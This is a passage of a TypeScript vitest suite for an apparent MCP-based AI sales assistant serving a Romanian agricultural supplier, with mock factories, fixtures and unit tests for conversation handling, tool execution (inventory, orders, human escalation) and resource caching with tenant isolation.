      sessionId: 'test-session-001',
      permissions: ['tool:execute', 'resource:read', 'resource:write'],
      quotas: {
        tokensRemaining: 100000,
        requestsRemaining: 1000,
        storageRemaining: 1073741824 // 1GB
      },
      settings: {
        maxTokensPerRequest: 8192,
        defaultModel: 'claude-3-sonnet',
        timeout: 30000
      },
      ...overrides
    };
  }

  /**
   * Create mock session
   */
  static createSession(overrides: Partial<MCPSession> = {}): MCPSession {
    return {
      id: 'sess-' + Date.now(),
      tenantId: 'test-tenant-001',
      userId: 'test-user-001',
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + 3600000),
      status: 'active',
      conversationId: null,
      metadata: {},
      ...overrides
    };
  }

  /**
   * Create mock conversation
   */
  static createConversation(overrides: Partial<Conversation> = {}): Conversation {
    return {
      id: 'conv-' + Date.now(),
      tenantId: 'test-tenant-001',
      sessionId: 'sess-001',
      customerId: 'cust-001',
      status: 'active',
      channel: 'web_chat',
      messages: [],
      context: {},
      startedAt: new Date(),
      lastActivityAt: new Date(),
      ...overrides
    };
  }

  /**
   * Create mock message
   */
  static createMessage(overrides: Partial<Message> = {}): Message {
    return {
      id: 'msg-' + Date.now(),
      conversationId: 'conv-001',
      role: 'user',
      content: 'Test message content',
      timestamp: new Date(),
      metadata: {},
      ...overrides
    };
  }

  /**
   * Create mock tool call
   */
  static createToolCall(overrides: Partial<ToolCall> = {}): ToolCall {
    return {
      id: 'tool-call-' + Date.now(),
      name: 'test_tool',
      arguments: {},
      ...overrides
    };
  }

  /**
   * Create mock tool result
   */
  static createToolResult(overrides: Partial<ToolResult> = {}): ToolResult {
    return {
      toolCallId: 'tool-call-001',
      success: true,
      result: { data: 'test result' },
      executionTime: 100,
      ...overrides
    };
  }

  /**
   * Create mock customer
   */
  static createCustomer(overrides: Partial<Customer> = {}): Customer {
    return {
      cui: '12345678',
      denumire: 'Test Company SRL',
      email: 'contact@test.ro',
      telefon: '0212345678',
      adresa: {
        strada: 'Str. Test Nr. 1',
        localitate: 'București',
        judet: 'București',
        codPostal: '010001'
      },
      tier: 'silver',
      status: 'active',
      ...overrides
    };
  }

  /**
   * Create mock product
   */
  static createProduct(overrides: Partial<Product> = {}): Product {
    return {
      id: 'prod-001',
      tenantId: 'test-tenant-001',
      sku: 'TEST-SKU-001',
      name: 'Test Product',
      category: 'fertilizers',
      price: 150.00,
      currency: 'RON',
      unit: 'kg',
      stock: 1000,
      description: 'Test product description',
      specifications: {},
      ...overrides
    };
  }

  /**
   * Create mock order
   */
  static createOrder(overrides: Partial<Order> = {}): Order {
    return {
      id: 'ord-001',
      tenantId: 'test-tenant-001',
      customerId: 'cust-001',
      conversationId: 'conv-001',
      status: 'pending',
      items: [
        {
          productId: 'prod-001',
          quantity: 10,
          unitPrice: 150.00,
          totalPrice: 1500.00
        }
      ],
      subtotal: 1500.00,
      tax: 285.00,
      total: 1785.00,
      currency: 'RON',
      createdAt: new Date(),
      ...overrides
    };
  }
}

/**
 * Test utilities
 */
export class TestUtils {
  /**
   * Wait for condition
   */
  static async waitFor(
    condition: () => boolean | Promise<boolean>,
    timeout: number = 5000,
    interval: number = 100
  ): Promise<void> {
    const start = Date.now();
    
    while (Date.now() - start < timeout) {
      if (await condition()) {
        return;
      }
      await new Promise(resolve => setTimeout(resolve, interval));
    }
    
    throw new Error(`Condition not met within ${timeout}ms`);
  }

  /**
   * Create delayed promise
   */
  static delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Create mock Redis client
   */
  static createMockRedis(): any {
    const store = new Map<string, any>();
    
    return {
      get: vi.fn(async (key: string) => store.get(key)),
      set: vi.fn(async (key: string, value: any, options?: any) => {
        store.set(key, value);
        return 'OK';
      }),
      del: vi.fn(async (...keys: string[]) => {
        let deleted = 0;
        for (const key of keys) {
          if (store.delete(key)) deleted++;
        }
        return deleted;
      }),
      exists: vi.fn(async (...keys: string[]) => {
        return keys.filter(k => store.has(k)).length;
      }),
      keys: vi.fn(async (pattern: string) => {
        const regex = new RegExp(pattern.replace('*', '.*'));
        return Array.from(store.keys()).filter(k => regex.test(k));
      }),
      incr: vi.fn(async (key: string) => {
        const val = (parseInt(store.get(key) || '0') + 1).toString();
        store.set(key, val);
        return parseInt(val);
      }),
      hget: vi.fn(async (key: string, field: string) => {
        const hash = store.get(key) || {};
        return hash[field];
      }),
      hset: vi.fn(async (key: string, ...args: any[]) => {
        const hash = store.get(key) || {};
        for (let i = 0; i < args.length; i += 2) {
          hash[args[i]] = args[i + 1];
        }
        store.set(key, hash);
        return 1;
      }),
      hgetall: vi.fn(async (key: string) => store.get(key) || {}),
      expire: vi.fn(async () => 1),
      ping: vi.fn(async () => 'PONG'),
      quit: vi.fn(async () => 'OK'),
      _store: store,
      _clear: () => store.clear()
    };
  }

  /**
   * Create mock database pool
   */
  static createMockPool(): any {
    const queryResults: Map<string, any[]> = new Map();
    
    return {
      query: vi.fn(async (sql: string, params?: any[]) => {
        // Default empty result
        return { rows: queryResults.get(sql) || [], rowCount: 0 };
      }),
      connect: vi.fn(async () => ({
        query: vi.fn(async () => ({ rows: [], rowCount: 0 })),
        release: vi.fn()
      })),
      end: vi.fn(async () => {}),
      _setQueryResult: (sql: string, rows: any[]) => queryResults.set(sql, rows),
      _clear: () => queryResults.clear()
    };
  }

  /**
   * Capture console output
   */
  static captureConsole(): {
    logs: string[];
    errors: string[];
    restore: () => void;
  } {
    const logs: string[] = [];
    const errors: string[] = [];
    const originalLog = console.log;
    const originalError = console.error;
    
    console.log = (...args) => logs.push(args.join(' '));
    console.error = (...args) => errors.push(args.join(' '));
    
    return {
      logs,
      errors,
      restore: () => {
        console.log = originalLog;
        console.error = originalError;
      }
    };
  }

  /**
   * Assert throws async
   */
  static async assertThrowsAsync(
    fn: () => Promise<any>,
    errorType?: new (...args: any[]) => Error,
    messagePattern?: RegExp
  ): Promise<Error> {
    try {
      await fn();
      throw new Error('Expected function to throw');
    } catch (error) {
      if (errorType && !(error instanceof errorType)) {
        throw new Error(`Expected ${errorType.name} but got ${error.constructor.name}`);
      }
      if (messagePattern && !messagePattern.test((error as Error).message)) {
        throw new Error(`Error message "${(error as Error).message}" doesn't match ${messagePattern}`);
      }
      return error as Error;
    }
  }
}

/**
 * Service mocks
 */
export class ServiceMocks {
  /**
   * Create mock Anthropic client
   */
  static createMockAnthropicClient(): any {
    return {
      messages: {
        create: vi.fn(async (params: any) => ({
          id: 'msg_' + Date.now(),
          type: 'message',
          role: 'assistant',
          content: [
            {
              type: 'text',
              text: 'Mock response from Claude'
            }
          ],
          model: params.model || 'claude-3-sonnet-20240229',
          stop_reason: 'end_turn',
          stop_sequence: null,
          usage: {
            input_tokens: 100,
            output_tokens: 50
          }
        }))
      }
    };
  }

  /**
   * Create mock tool executor
   */
  static createMockToolExecutor(): ToolExecutor {
    const executor = {
      execute: vi.fn(async (toolName: string, params: any) => ({
        success: true,
        result: { mocked: true, tool: toolName, params },
        executionTime: 50
      })),
      validateParams: vi.fn(async () => ({ valid: true, errors: [] })),
      getToolSchema: vi.fn((toolName: string) => ({
        name: toolName,
        description: `Mock ${toolName} tool`,
        parameters: { type: 'object', properties: {} }
      }))
    };
    
    return executor as unknown as ToolExecutor;
  }

  /**
   * Create mock resource manager
   */
  static createMockResourceManager(): ResourceManager {
    const resources = new Map<string, any>();
    
    return {
      load: vi.fn(async (uri: string) => resources.get(uri) || { content: 'mock content' }),
      save: vi.fn(async (uri: string, content: any) => {
        resources.set(uri, content);
        return true;
      }),
      exists: vi.fn(async (uri: string) => resources.has(uri)),
      delete: vi.fn(async (uri: string) => resources.delete(uri)),
      list: vi.fn(async () => Array.from(resources.keys())),
      _resources: resources
    } as unknown as ResourceManager;
  }

  /**
   * Create mock event emitter
   */
  static createMockEventEmitter(): any {
    const listeners: Map<string, Function[]> = new Map();
    const emitted: Array<{ event: string; args: any[] }> = [];
    
    return {
      on: vi.fn((event: string, handler: Function) => {
        if (!listeners.has(event)) listeners.set(event, []);
        listeners.get(event)!.push(handler);
      }),
      emit: vi.fn((event: string, ...args: any[]) => {
        emitted.push({ event, args });
        const handlers = listeners.get(event) || [];
        handlers.forEach(h => h(...args));
      }),
      off: vi.fn((event: string, handler: Function) => {
        const handlers = listeners.get(event) || [];
        const idx = handlers.indexOf(handler);
        if (idx >= 0) handlers.splice(idx, 1);
      }),
      removeAllListeners: vi.fn((event?: string) => {
        if (event) listeners.delete(event);
        else listeners.clear();
      }),
      _emitted: emitted,
      _listeners: listeners
    };
  }
}

/**
 * Test fixtures
 */
export class TestFixtures {
  /**
   * Sample conversations for testing
   */
  static readonly CONVERSATIONS = {
    simple: {
      messages: [
        { role: 'user', content: 'Bună ziua, doresc informații despre îngrășăminte' },
        { role: 'assistant', content: 'Bună ziua! Cu plăcere vă ajut. Ce tip de îngrășăminte vă interesează?' },
        { role: 'user', content: 'NPK pentru grâu' }
      ]
    },
    withToolUse: {
      messages: [
        { role: 'user', content: 'Vreau să comand 500kg de îngrășământ NPK' },
        { 
          role: 'assistant', 
          content: 'Verific disponibilitatea...',
          toolCalls: [
            { id: 'tc1', name: 'check_inventory', arguments: { sku: 'NPK-15-15-15', quantity: 500 } }
          ]
        },
        { role: 'tool', toolCallId: 'tc1', content: JSON.stringify({ available: true, stock: 2000 }) },
        { role: 'assistant', content: 'Avem în stoc. Dorești să plasez comanda?' }
      ]
    },
    escalation: {
      messages: [
        { role: 'user', content: 'Am o problemă cu livrarea comenzii #12345' },
        { role: 'assistant', content: 'Îmi pare rău pentru inconvenient. Verific...' },
        { role: 'user', content: 'Vreau să vorbesc cu un om, nu cu un robot!' }
      ],
      expectedAction: 'escalate_to_human'
    }
  };

  /**
   * Sample products for testing
   */
  static readonly PRODUCTS = {
    fertilizer: {
      id: 'prod-fert-001',
      sku: 'NPK-15-15-15',
      name: 'Îngrășământ NPK 15-15-15',
      category: 'fertilizers',
      subcategory: 'npk',
      price: 180.00,
      currency: 'RON',
      unit: 'kg',
      minOrder: 100,
      stock: 5000,
      description: 'Îngrășământ complex pentru toate culturile'
    },
    seed: {
      id: 'prod-seed-001',
      sku: 'WHEAT-SEED-A',
      name: 'Semințe grâu Apache',
      category: 'seeds',
      subcategory: 'cereals',
      price: 2.50,
      currency: 'RON',
      unit: 'kg',
      minOrder: 1000,
      stock: 20000,
      description: 'Soi productiv, rezistent la secetă'
    },
    pesticide: {
      id: 'prod-pest-001',
      sku: 'HERB-GLIF-5L',
      name: 'Erbicid Glifosat 5L',
      category: 'pesticides',
      subcategory: 'herbicides',
      price: 95.00,
      currency: 'RON',
      unit: 'litru',
      minOrder: 5,
      stock: 500,
      description: 'Erbicid total pentru terenuri necultivate'
    }
  };

  /**
   * Sample customers for testing
   */
  static readonly CUSTOMERS = {
    small: {
      cui: 'RO12345678',
      denumire: 'Ferma Mică SRL',
      tier: 'bronze',
      suprafata_agricola: 50,
      culturi: ['grâu', 'porumb'],
      contact: {
        email: 'contact@fermamica.ro',
        telefon: '0723456789'
      }
    },
    medium: {
      cui: 'RO23456789',
      denumire: 'AgroMediu SA',
      tier: 'silver',
      suprafata_agricola: 500,
      culturi: ['grâu', 'porumb', 'floarea soarelui', 'rapiță'],
      contact: {
        email: 'achizitii@aromediu.ro',
        telefon: '0734567890'
      }
    },
    large: {
      cui: 'RO34567890',
      denumire: 'MegaAgro Holding SRL',
      tier: 'gold',
      suprafata_agricola: 5000,
      culturi: ['grâu', 'porumb', 'floarea soarelui', 'rapiță', 'soia', 'sfeclă'],
      contact: {
        email: 'director@megaagro.ro',
        telefon: '0745678901'
      }
    }
  };
}

// tests/unit/conversation-manager.test.ts
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { ConversationManager } from '../../src/conversation/manager';
import { MockFactory, TestUtils, ServiceMocks } from './setup';

describe('ConversationManager', () => {
  let manager: ConversationManager;
  let mockRedis: any;
  let mockPool: any;
  let mockAnthropicClient: any;
  
  beforeEach(() => {
    mockRedis = TestUtils.createMockRedis();
    mockPool = TestUtils.createMockPool();
    mockAnthropicClient = ServiceMocks.createMockAnthropicClient();
    
    manager = new ConversationManager({
      redis: mockRedis,
      pool: mockPool,
      anthropicClient: mockAnthropicClient
    });
  });
  
  afterEach(() => {
    vi.clearAllMocks();
    mockRedis._clear();
    mockPool._clear();
  });
  
  describe('createConversation', () => {
    it('should create a new conversation with valid context', async () => {
      const tenantContext = MockFactory.createTenantContext();
      const session = MockFactory.createSession();
      const customerId = 'cust-001';
      
      const conversation = await manager.createConversation({
        tenantContext,
        session,
        customerId,
        channel: 'web_chat'
      });
      
      expect(conversation).toBeDefined();
      expect(conversation.id).toMatch(/^conv-/);
      expect(conversation.tenantId).toBe(tenantContext.tenantId);
      expect(conversation.customerId).toBe(customerId);
      expect(conversation.status).toBe('active');
    });
    
    it('should reject creation without valid session', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      await expect(
        manager.createConversation({
          tenantContext,
          session: null as any,
          customerId: 'cust-001',
          channel: 'web_chat'
        })
      ).rejects.toThrow('Valid session required');
    });
    
    it('should inherit customer preferences', async () => {
      const tenantContext = MockFactory.createTenantContext();
      const session = MockFactory.createSession();
      const customer = MockFactory.createCustomer({
        preferences: {
          language: 'ro',
          communicationStyle: 'formal'
        }
      });
      
      mockPool._setQueryResult('SELECT', [customer]);
      
      const conversation = await manager.createConversation({
        tenantContext,
        session,
        customerId: customer.cui,
        channel: 'web_chat'
      });
      
      expect(conversation.context.customerPreferences).toEqual(customer.preferences);
    });
  });
  
  describe('addMessage', () => {
    it('should add user message to conversation', async () => {
      const conversation = MockFactory.createConversation();
      
      const updated = await manager.addMessage(conversation.id, {
        role: 'user',
        content: 'Test message'
      });
      
      expect(updated.messages).toHaveLength(1);
      expect(updated.messages[0].role).toBe('user');
      expect(updated.messages[0].content).toBe('Test message');
    });
    
    it('should validate message content', async () => {
      const conversation = MockFactory.createConversation();
      
      await expect(
        manager.addMessage(conversation.id, {
          role: 'user',
          content: ''
        })
      ).rejects.toThrow('Message content cannot be empty');
    });
    
    it('should update lastActivityAt timestamp', async () => {
      const conversation = MockFactory.createConversation();
      const beforeAdd = new Date();
      
      await TestUtils.delay(10);
      
      const updated = await manager.addMessage(conversation.id, {
        role: 'user',
        content: 'Test'
      });
      
      expect(updated.lastActivityAt.getTime()).toBeGreaterThan(beforeAdd.getTime());
    });
    
    it('should enforce token limits', async () => {
      const conversation = MockFactory.createConversation();
      const longContent = 'A'.repeat(100001); // Exceeds typical limit
      
      await expect(
        manager.addMessage(conversation.id, {
          role: 'user',
          content: longContent
        })
      ).rejects.toThrow(/token limit|content too long/i);
    });
  });
  
  describe('generateResponse', () => {
    it('should generate assistant response', async () => {
      const conversation = MockFactory.createConversation({
        messages: [
          MockFactory.createMessage({ role: 'user', content: 'Salut!' })
        ]
      });
      
      mockAnthropicClient.messages.create.mockResolvedValueOnce({
        id: 'msg_123',
        content: [{ type: 'text', text: 'Bună ziua! Cu ce vă pot ajuta?' }],
        usage: { input_tokens: 10, output_tokens: 15 }
      });
      
      const response = await manager.generateResponse(conversation);
      
      expect(response).toBeDefined();
      expect(response.content).toBe('Bună ziua! Cu ce vă pot ajuta?');
      expect(mockAnthropicClient.messages.create).toHaveBeenCalled();
    });
    
    it('should handle tool calls in response', async () => {
      const conversation = MockFactory.createConversation({
        messages: [
          MockFactory.createMessage({ role: 'user', content: 'Ce produse aveți?' })
        ]
      });
      
      mockAnthropicClient.messages.create.mockResolvedValueOnce({
        id: 'msg_123',
        content: [
          { type: 'text', text: 'Verific catalogul...' },
          { 
            type: 'tool_use',
            id: 'tc_1',
            name: 'search_products',
            input: { category: 'all' }
          }
        ],
        stop_reason: 'tool_use',
        usage: { input_tokens: 15, output_tokens: 25 }
      });
      
      const response = await manager.generateResponse(conversation);
      
      expect(response.toolCalls).toHaveLength(1);
      expect(response.toolCalls[0].name).toBe('search_products');
      expect(response.requiresToolExecution).toBe(true);
    });
    
    it('should track token usage', async () => {
      const tenantContext = MockFactory.createTenantContext({
        quotas: { tokensRemaining: 1000, requestsRemaining: 100, storageRemaining: 1e9 }
      });
      
      const conversation = MockFactory.createConversation({
        messages: [MockFactory.createMessage({ role: 'user', content: 'Test' })]
      });
      
      mockAnthropicClient.messages.create.mockResolvedValueOnce({
        id: 'msg_123',
        content: [{ type: 'text', text: 'Response' }],
        usage: { input_tokens: 50, output_tokens: 100 }
      });
      
      const response = await manager.generateResponse(conversation, { tenantContext });
      
      expect(response.usage).toEqual({
        inputTokens: 50,
        outputTokens: 100,
        totalTokens: 150
      });
    });
    
    it('should handle rate limit errors with retry', async () => {
      const conversation = MockFactory.createConversation({
        messages: [MockFactory.createMessage({ role: 'user', content: 'Test' })]
      });
      
      mockAnthropicClient.messages.create
        .mockRejectedValueOnce({ status: 429, message: 'Rate limited' })
        .mockResolvedValueOnce({
          id: 'msg_123',
          content: [{ type: 'text', text: 'Success after retry' }],
          usage: { input_tokens: 10, output_tokens: 15 }
        });
      
      const response = await manager.generateResponse(conversation);
      
      expect(response.content).toBe('Success after retry');
      expect(mockAnthropicClient.messages.create).toHaveBeenCalledTimes(2);
    });
  });
  
  describe('endConversation', () => {
    it('should mark conversation as completed', async () => {
      const conversation = MockFactory.createConversation({ status: 'active' });
      
      const ended = await manager.endConversation(conversation.id, 'completed');
      
      expect(ended.status).toBe('completed');
      expect(ended.endedAt).toBeDefined();
    });
    
    it('should save conversation summary', async () => {
      const conversation = MockFactory.createConversation({
        messages: [
          MockFactory.createMessage({ role: 'user', content: 'Vreau NPK' }),
          MockFactory.createMessage({ role: 'assistant', content: 'Avem NPK 15-15-15' }),
          MockFactory.createMessage({ role: 'user', content: 'Comand 100kg' })
        ]
      });
      
      const ended = await manager.endConversation(conversation.id, 'completed');
      
      expect(ended.summary).toBeDefined();
      expect(ended.summary.messageCount).toBe(3);
    });
    
    it('should emit conversation.ended event', async () => {
      const conversation = MockFactory.createConversation();
      const eventHandler = vi.fn();
      
      manager.on('conversation.ended', eventHandler);
      
      await manager.endConversation(conversation.id, 'completed');
      
      expect(eventHandler).toHaveBeenCalledWith(
        expect.objectContaining({
          conversationId: conversation.id,
          reason: 'completed'
        })
      );
    });
  });
});

// tests/unit/tool-executor.test.ts
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { ToolExecutor } from '../../src/tools/executor';
import { MockFactory, TestUtils, ServiceMocks, TestFixtures } from './setup';

describe('ToolExecutor', () => {
  let executor: ToolExecutor;
  let mockRedis: any;
  let mockPool: any;
  
  beforeEach(() => {
    mockRedis = TestUtils.createMockRedis();
    mockPool = TestUtils.createMockPool();
    
    executor = new ToolExecutor({
      redis: mockRedis,
      pool: mockPool,
      timeout: 10000
    });
  });
  
  afterEach(() => {
    vi.clearAllMocks();
  });
  
  describe('execute', () => {
    it('should execute registered tool', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      const result = await executor.execute('search_products', {
        query: 'NPK',
        limit: 10
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result).toBeDefined();
    });
    
    it('should reject unregistered tool', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      await expect(
        executor.execute('nonexistent_tool', {}, { tenantContext })
      ).rejects.toThrow('Tool not found: nonexistent_tool');
    });
    
    it('should validate input parameters', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      await expect(
        executor.execute('search_products', {
          query: 123 // Should be string
        }, { tenantContext })
      ).rejects.toThrow(/validation|invalid/i);
    });
    
    it('should enforce permissions', async () => {
      const tenantContext = MockFactory.createTenantContext({
        permissions: ['tool:read'] // Missing tool:execute
      });
      
      await expect(
        executor.execute('create_order', {
          customerId: 'cust-001',
          items: []
        }, { tenantContext })
      ).rejects.toThrow(/permission|unauthorized/i);
    });
    
    it('should timeout long-running tools', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      // Register slow tool
      executor.registerTool('slow_tool', {
        handler: async () => {
          await TestUtils.delay(15000);
          return { result: 'done' };
        },
        schema: { type: 'object', properties: {} }
      });
      
      await expect(
        executor.execute('slow_tool', {}, { tenantContext, timeout: 100 })
      ).rejects.toThrow(/timeout/i);
    });
    
    it('should record execution metrics', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      const result = await executor.execute('search_products', {
        query: 'test'
      }, { tenantContext });
      
      expect(result.executionTime).toBeGreaterThan(0);
      expect(result.executionTime).toBeLessThan(10000);
    });
  });
  
  describe('tool: search_products', () => {
    it('should search products by query', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [
        TestFixtures.PRODUCTS.fertilizer,
        TestFixtures.PRODUCTS.seed
      ]);
      
      const result = await executor.execute('search_products', {
        query: 'grâu',
        limit: 10
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.products).toHaveLength(2);
    });
    
    it('should filter by category', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [TestFixtures.PRODUCTS.fertilizer]);
      
      const result = await executor.execute('search_products', {
        query: '',
        category: 'fertilizers',
        limit: 10
      }, { tenantContext });
      
      expect(result.result.products[0].category).toBe('fertilizers');
    });
    
    it('should respect tenant isolation', async () => {
      const tenantContext = MockFactory.createTenantContext({ tenantId: 'tenant-A' });
      
      await executor.execute('search_products', {
        query: 'test'
      }, { tenantContext });
      
      // Verify tenant_id was included in query
      expect(mockPool.query).toHaveBeenCalledWith(
        expect.stringContaining('tenant_id'),
        expect.arrayContaining(['tenant-A'])
      );
    });
  });
  
  describe('tool: check_inventory', () => {
    it('should return available stock', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [{
        sku: 'NPK-15-15-15',
        stock: 5000,
        reserved: 200
      }]);
      
      const result = await executor.execute('check_inventory', {
        sku: 'NPK-15-15-15',
        quantity: 100
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.available).toBe(true);
      expect(result.result.availableStock).toBe(4800); // 5000 - 200
    });
    
    it('should return unavailable when insufficient stock', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [{
        sku: 'NPK-15-15-15',
        stock: 100,
        reserved: 50
      }]);
      
      const result = await executor.execute('check_inventory', {
        sku: 'NPK-15-15-15',
        quantity: 100
      }, { tenantContext });
      
      expect(result.result.available).toBe(false);
      expect(result.result.availableStock).toBe(50);
    });
  });
  
  describe('tool: create_order', () => {
    it('should create order with valid items', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [TestFixtures.PRODUCTS.fertilizer]);
      
      const result = await executor.execute('create_order', {
        customerId: 'cust-001',
        items: [
          { sku: 'NPK-15-15-15', quantity: 100 }
        ]
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.orderId).toBeDefined();
      expect(result.result.total).toBeGreaterThan(0);
    });
    
    it('should require HITL approval for large orders', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [TestFixtures.PRODUCTS.fertilizer]);
      
      const result = await executor.execute('create_order', {
        customerId: 'cust-001',
        items: [
          { sku: 'NPK-15-15-15', quantity: 10000 } // Large quantity
        ]
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.status).toBe('pending_approval');
      expect(result.result.requiresApproval).toBe(true);
    });
    
    it('should validate minimum order quantity', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [{
        ...TestFixtures.PRODUCTS.fertilizer,
        minOrder: 100
      }]);
      
      await expect(
        executor.execute('create_order', {
          customerId: 'cust-001',
          items: [
            { sku: 'NPK-15-15-15', quantity: 10 } // Below minimum
          ]
        }, { tenantContext })
      ).rejects.toThrow(/minimum order|cantitate minimă/i);
    });
  });
  
  describe('tool: get_customer_info', () => {
    it('should return customer information', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [TestFixtures.CUSTOMERS.medium]);
      
      const result = await executor.execute('get_customer_info', {
        customerId: 'RO23456789'
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.customer.denumire).toBe('AgroMediu SA');
      expect(result.result.customer.tier).toBe('silver');
    });
    
    it('should include order history', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [TestFixtures.CUSTOMERS.medium]);
      
      const result = await executor.execute('get_customer_info', {
        customerId: 'RO23456789',
        includeHistory: true
      }, { tenantContext });
      
      expect(result.result.orderHistory).toBeDefined();
    });
    
    it('should mask sensitive data based on permissions', async () => {
      const tenantContext = MockFactory.createTenantContext({
        permissions: ['tool:execute'] // No customer:read_sensitive
      });
      
      mockPool._setQueryResult('SELECT', [{
        ...TestFixtures.CUSTOMERS.medium,
        iban: 'RO49AAAA1B31007593840000'
      }]);
      
      const result = await executor.execute('get_customer_info', {
        customerId: 'RO23456789'
      }, { tenantContext });
      
      expect(result.result.customer.iban).toMatch(/^\*+/); // Masked
    });
  });
  
  describe('tool: escalate_to_human', () => {
    it('should create escalation request', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      const result = await executor.execute('escalate_to_human', {
        conversationId: 'conv-001',
        reason: 'customer_request',
        priority: 'high',
        context: 'Customer insisted on speaking with a human'
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.escalationId).toBeDefined();
      expect(result.result.status).toBe('queued');
    });
    
    it('should estimate wait time', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      // Mock queue stats
      mockRedis.hgetall.mockResolvedValueOnce({
        queueLength: '5',
        avgHandleTime: '300'
      });
      
      const result = await executor.execute('escalate_to_human', {
        conversationId: 'conv-001',
        reason: 'complex_issue',
        priority: 'normal'
      }, { tenantContext });
      
      expect(result.result.estimatedWaitMinutes).toBeGreaterThan(0);
    });
  });
});

// tests/unit/resource-manager.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { ResourceManager } from '../../src/resources/manager';
import { MockFactory, TestUtils } from './setup';

describe('ResourceManager', () => {
  let manager: ResourceManager;
  let mockRedis: any;
  let mockPool: any;
  
  beforeEach(() => {
    mockRedis = TestUtils.createMockRedis();
    mockPool = TestUtils.createMockPool();
    
    manager = new ResourceManager({
      redis: mockRedis,
      pool: mockPool,
      cacheEnabled: true,
      cacheTtl: 300
    });
  });
  
  describe('load', () => {
    it('should load resource from database', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [{
        uri: 'customer://RO12345678',
        content: JSON.stringify({ name: 'Test Customer' }),
        mimeType: 'application/json'
      }]);
      
      const resource = await manager.load('customer://RO12345678', { tenantContext });
      
      expect(resource).toBeDefined();
      expect(resource.content.name).toBe('Test Customer');
    });
    
    it('should return cached resource', async () => {
      const tenantContext = MockFactory.createTenantContext();
      const uri = 'customer://RO12345678';
      
      // First load - from database
      mockPool._setQueryResult('SELECT', [{
        uri,
        content: JSON.stringify({ name: 'Test' }),
        mimeType: 'application/json'
      }]);
      
      await manager.load(uri, { tenantContext });
      
      // Second load - should use cache
      mockPool.query.mockClear();
      
      const cached = await manager.load(uri, { tenantContext });
      
      expect(cached.fromCache).toBe(true);
      expect(mockPool.query).not.toHaveBeenCalled();
    });
    
    it('should respect tenant isolation', async () => {
      const contextA = MockFactory.createTenantContext({ tenantId: 'tenant-A' });
      const contextB = MockFactory.createTenantContext({ tenantId: 'tenant-B' });
      
      // Load for tenant A
      mockPool._setQueryResult('SELECT', [{ uri: 'test', content: '{}' }]);
      await manager.load('customer://shared-id', { tenantContext: contextA });
      
      // Load for tenant B - should not use A's cache
      mockPool.query.mockClear();
      mockPool._setQueryResult('SELECT', [{ uri: 'test', content: '{}' }]);
      
      const resourceB = await manager.load('customer://shared-id', { tenantContext: contextB });
      
      expect(mockPool.query).toHaveBeenCalled(); // Cache miss
    });
    
    it('should throw on non-existent resource', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', []);
      
      await expect(
        manager.load('customer://nonexistent', { tenantContext })
      ).rejects.toThrow(/not found/i);
    });
  });
  
  describe('save', () => {
    it('should save resource to database', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      const result = await manager.save('note://conv-001/note-1', {
        content: 'Test note content',
        metadata: { author: 'system' }
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(mockPool.query).toHaveBeenCalled();
    });
    
    it('should invalidate cache on save', async () => {
      const tenantContext = MockFactory.createTenantContext();
      const uri = 'note://test-note';
      
      // Pre-populate cache
      mockRedis.set(`resource:${tenantContext.tenantId}:${uri}`, JSON.stringify({ old: 'data' }));
      
      await manager.save(uri, { new: 'data' }, { tenantContext });
      
      expect(mockRedis.del).toHaveBeenCalledWith(
        expect.stringContaining(uri)
      );
    });
    
    it('should validate content before saving', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      await expect(
        manager.save('customer://test', null as any, { tenantContext })
      ).rejects.toThrow(/content.*required/i);
    });
  });
  
  describe('list', () => {
    it('should list resources by prefix', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', [
        { uri: 'note://conv-001/note-1' },
        { uri: 'note://conv-001/note-2' },
        { uri: 'note://conv-001/note-3' }
      ]);
      
      const resources = await manager.list('note://conv-001/', { tenantContext });
      
      expect(resources).toHaveLength(3);
      expect(resources.every(r => r.uri.startsWith('note://conv-001/'))).toBe(true);
    });
    
    it('should paginate results', async () => {
      const tenantContext = MockFactory.createTenantContext();
      
      mockPool._setQueryResult('SELECT', Array(10).fill(null).map((_, i) => ({
        uri: `note://conv-001/note-${i}`
      })));
      
      const page1 = await manager.list('note://conv-001/', {
        tenantContext,
        limit: 5,
        offset: 0
      });
      
